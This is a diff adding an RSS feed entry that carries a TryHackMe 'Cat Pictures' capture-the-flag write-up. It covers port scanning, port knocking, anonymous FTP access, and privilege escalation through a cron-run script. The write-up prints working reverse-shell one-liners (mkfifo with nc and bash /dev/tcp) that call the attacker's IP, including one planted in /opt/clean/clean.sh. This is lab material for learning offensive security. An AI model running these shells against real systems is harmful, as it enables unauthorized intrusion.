@@ -224,6 +224,262 @@ root.txt
 </description>
         </item>
         <item>
+        <title>TryHackMe: Cat Pictures Writeup</title>
+        <link>https://chaudhary1337.github.io/p/tryhackme-cat-pictures-writeup/</link>
+        <pubDate>Mon, 28 Jun 2021 00:00:00 +0000</pubDate>
+        
+        <guid>https://chaudhary1337.github.io/p/tryhackme-cat-pictures-writeup/</guid>
+        <description>&lt;img src="https://i.imgur.com/eZVWRZC.jpg" alt="Featured image of post TryHackMe: Cat Pictures Writeup" /&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/room/catpictures&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Play&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;1-scanning--enumeration&#34;&gt;1. Scanning &amp;amp; Enumeration&lt;/h2&gt;
+&lt;p&gt;We do the below scans in parallel.&lt;/p&gt;
+&lt;h3 id=&#34;11-port-scanning&#34;&gt;1.1. Port Scanning&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;Not shown: 998 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 37:43:64:80:d3:5a:74:62:81:b7:80:6b:1a:23:d8:4a (RSA)
+|   256 53:c6:82:ef:d2:77:33:ef:c1:3d:9c:15:13:54:0e:b2 (ECDSA)
+|_  256 ba:97:c3:23:d4:f2:cc:08:2c:e1:2b:30:06:18:95:41 (ED25519)
+8080/tcp open  http    Apache httpd 2.4.46 ((Unix) OpenSSL/1.1.1d PHP/7.3.27)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+| http-open-proxy: Potentially OPEN proxy.
+|_Methods supported:CONNECTION
+|_http-server-header: Apache/2.4.46 (Unix) OpenSSL/1.1.1d PHP/7.3.27
+|_http-title: Cat Pictures - Index page
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Info gathered:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;SSH on 22 open&lt;/li&gt;
+&lt;li&gt;HTTP on 8080 open&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;12-web-enumeration&#34;&gt;1.2. Web Enumeration&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
+└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x &#39;php,html,txt&#39; -t 108 -q -u http://10.10.153.40:8080
+/faq.php              (Status: 301) [Size: 462] [--&amp;gt; /app.php/help/faq?sid=0f2b319a8907b891633fc255b6e4601e]
+/download             (Status: 301) [Size: 242] [--&amp;gt; http://10.10.153.40:8080/download/]                    
+/feed                 (Status: 200) [Size: 1462]                                                            
+/feed.php             (Status: 301) [Size: 298] [--&amp;gt; /app.php/feed]                                         
+/common.php           (Status: 403) [Size: 199]                                                             
+/images               (Status: 301) [Size: 240] [--&amp;gt; http://10.10.153.40:8080/images/]                      
+/index.php            (Status: 200) [Size: 13114]
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We could epxlore these later on.&lt;/p&gt;
+&lt;h3 id=&#34;13-web-exploration&#34;&gt;1.3. Web Exploration&lt;/h3&gt;
+&lt;p&gt;homepage of the website
+&lt;img src=&#34;https://i.imgur.com/AK2Rzi4.png&#34; alt=&#34;homepage of the website of the thm room catpictures&#34;  /&gt;&lt;/p&gt;
+&lt;p&gt;The post asking us to do &lt;strong&gt;port-knocking&lt;/strong&gt;
+&lt;img src=&#34;https://i.imgur.com/t7T3zGe.png&#34; alt=&#34;the user post on the thm room&#34;  /&gt;&lt;/p&gt;
+&lt;p&gt;Info gathered:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Registeration does not work - a page is present syaing all email related stuff will not work.&lt;/li&gt;
+&lt;li&gt;Login bruteforce could be one option we are looking at.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;14-knock-knock-whos-there&#34;&gt;1.4. Knock knock, whos there?&lt;/h3&gt;
+&lt;p&gt;Let&amp;rsquo;s knock at all the ports. This will probably open up some more ports for us to explore.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
+└─$ telnet 10.10.239.160 1111     
+Trying 10.10.239.160...
+telnet: Unable to connect to remote host: Connection refused
+                                                                                                                          
+┌──(kali㉿kali)-[~]
+└─$ telnet 10.10.239.160 2222
+Trying 10.10.239.160...
+telnet: Unable to connect to remote host: Connection refused
+                                                                                                                          
+┌──(kali㉿kali)-[~]
+└─$ telnet 10.10.239.160 3333
+Trying 10.10.239.160...
+telnet: Unable to connect to remote host: Connection refused
+                                                                                                                          
+┌──(kali㉿kali)-[~]
+└─$ telnet 10.10.239.160 4444
+Trying 10.10.239.160...
+telnet: Unable to connect to remote host: Connection refused
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;15-full-port-scan&#34;&gt;1.5. Full Port Scan&lt;/h3&gt;
+&lt;p&gt;After port knocking, we do a full port scan. We are expecting 2 more ports here. 4420 and 21. You may need to do another scan if only 4420 is open.&lt;/p&gt;
+&lt;p&gt;The port 4420 reveals:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
+└─$ telnet 10.10.239.160 4420
+Trying 10.10.239.160...
+Connected to 10.10.239.160.
+Escape character is &#39;^]&#39;.
+INTERNAL SHELL SERVICE
+please note: cd commands do not work at the moment, the developers are fixing it at the moment.
+do not use ctrl-c
+Please enter password:
+password
+Invalid password...
+Connection Closed
+Connection closed by foreign host.
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;How about port 21?&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
+└─$ ftp 10.10.239.160
+Connected to 10.10.239.160.
+220 (vsFTPd 3.0.3)
+Name (10.10.239.160:kali): anonymous
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&amp;gt; ls -la
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 ftp      ftp          4096 Apr 02 14:32 .
+drwxr-xr-x    2 ftp      ftp          4096 Apr 02 14:32 ..
+-rw-r--r--    1 ftp      ftp           162 Apr 02 14:32 note.txt
+226 Directory send OK.
+ftp&amp;gt; get note.txt
+local: note.txt remote: note.txt
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for note.txt (162 bytes).
+226 Transfer complete.
+162 bytes received in 0.00 secs (102.3306 kB/s)
+ftp&amp;gt; 
+221 Goodbye.
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We get the note.txt file having a password!&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
+└─$ cat note.txt 
+In case I forget my password, I&#39;m leaving a pointer to the internal shell service on the server.
+
+Connect to port 4420, the password is {password_was_here_yee}.
+- catlover
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Okay. Now we can enter into the port 4420!&lt;/p&gt;
+&lt;h2 id=&#34;2-foothold&#34;&gt;2. Foothold&lt;/h2&gt;
+&lt;p&gt;NOTE: DO NOT USE &lt;code&gt;telnet $IP $PORT&lt;/code&gt;, use netcat as &lt;code&gt;nc $IP $PORT&lt;/code&gt; instead. Now, put in the password.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;ls -la /home/catlover
+total 28
+drwxr-xr-x 2 0 0  4096 Apr  3 01:34 .
+drwxr-xr-x 3 0 0  4096 Apr  2 20:51 ..
+-rwxr-xr-x 1 0 0 18856 Apr  3 01:35 runme
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ah this file asks us to get a proper shell first. Here&amp;rsquo;s what you do:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;On the attacked machine: &lt;code&gt;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&amp;gt;&amp;amp;1|nc 10.17.8.184 1337 &amp;gt;/tmp/f&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;On your machine: &lt;code&gt;nc -lnvp 1337&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;Now, we can run the file as below:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# ./home/catlover/runme
+Please enter yout password: ilikecats
+Access Denied
+# 
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;21-reversing&#34;&gt;2.1. Reversing&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;Get the file on your machine. I used netcat.
+&lt;img src=&#34;https://i.imgur.com/s78mJ5c.png&#34; alt=&#34;transferring the file using netcat&#34;  /&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Doing &lt;code&gt;strings&lt;/code&gt; we get some intersting information:&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre&gt;&lt;code&gt;{password_was_here}
+Please enter yout password: 
+Welcome, catlover! SSH key transfer queued! 
+touch /tmp/gibmethesshkey
+Access Denied
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Once you execute the file &lt;code&gt;./home/catlover/runme&lt;/code&gt;, put the password. Dont&#39; forget to &lt;code&gt;touch /tmp/gibmethesshkey&lt;/code&gt; so that &lt;code&gt;id_rsa&lt;/code&gt; appears in the user folder.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# cat /home/catlover/id_rsa
+-----BEGIN RSA PRIVATE KEY-----
+...
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;3-privesc&#34;&gt;3. PrivEsc&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
+└─$ ssh -i id_rsa  catlover@10.10.239.160
+The authenticity of host &#39;10.10.239.160 (10.10.239.160)&#39; can&#39;t be established.
+ECDSA key fingerprint is SHA256:7HBac/JH7EKQik9kL1l9GMjCgLN/69gfXalu5cbPi4U.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &#39;10.10.239.160&#39; (ECDSA) to the list of known hosts.
+Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-142-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sun Jun 27 20:31:52 PDT 2021
+
+  System load:                    0.12
+  Usage of /:                     37.1% of 19.56GB
+  Memory usage:                   69%
+  Swap usage:                     0%
+  Processes:                      113
+  Users logged in:                0
+  IP address for eth0:            10.10.239.160
+  IP address for br-98674f8f20f9: 172.18.0.1
+  IP address for docker0:         172.17.0.1
+
+
+52 updates can be applied immediately.
+25 of these updates are standard security updates.
+To see these additional updates run: apt list --upgradable
+
+
+Last login: Fri Jun  4 14:40:35 2021
+root@7546fa2336d6:/# id
+uid=0(root) gid=0(root) groups=0(root)
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Looks like a docker container (from the name of the machine).&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;root@7546fa2336d6:/# ls -la
+total 108
+drwxr-xr-x   1 root root 4096 Mar 25 16:18 .
+drwxr-xr-x   1 root root 4096 Mar 25 16:18 ..
+-rw-------   1 root root  588 Jun  4 23:39 .bash_history
+-rwxr-xr-x   1 root root    0 Mar 25 16:08 .dockerenv
+...
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Wait &lt;code&gt;.bash_history&lt;/code&gt; &amp;hellip; ?&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;root@7546fa2336d6:/# cat .bash_history
+exit
+exit
+exit
+exit
+exit
+exit
+exit
+ip a
+ifconfig
+apt install ifconfig
+ip
+exit
+nano /opt/clean/clean.sh 
+ping 192.168.4.20
+apt install ping
+apt update
+apt install ping
+apt install iptuils-ping
+apt install iputils-ping
+exit
+ls
+cat /opt/clean/clean.sh 
+nano /opt/clean/clean.sh 
+clear
+cat /etc/crontab
+ls -alt /
+cat /post-init.sh 
+cat /opt/clean/clean.sh 
+bash -i &amp;gt;&amp;amp;/dev/tcp/192.168.4.20/4444 &amp;lt;&amp;amp;1
+nano /opt/clean/clean.sh 
+nano /opt/clean/clean.sh 
+nano /opt/clean/clean.sh 
+nano /opt/clean/clean.sh 
+cat /var/log/dpkg.log 
+nano /opt/clean/clean.sh 
+nano /opt/clean/clean.sh 
+exit
+exit
+exit
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Huh. Interesting.&lt;/p&gt;
+&lt;h3 id=&#34;31-exploiting-shady-file&#34;&gt;3.1. Exploiting Shady File&lt;/h3&gt;
+&lt;p&gt;I edited the file and put a reverse shell (similar to the one in the bash history).&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;root@7546fa2336d6:/# nano /opt/clean/clean.sh
+root@7546fa2336d6:/# cat /opt/clean/clean.sh
+#!/bin/bash
+
+sh -i &amp;gt;&amp;amp; /dev/tcp/10.17.8.184/7331 0&amp;gt;&amp;amp;1
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;wait some time &amp;hellip;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# cat root.txt
+Congrats!!!
+Here is your flag:
+...
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And we are done!&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>TryHackMe: Revenge Writeup</title>
         <link>https://chaudhary1337.github.io/p/tryhackme-revenge-writeup/</link>
         <pubDate>Sun, 27 Jun 2021 00:00:00 +0000</pubDate>
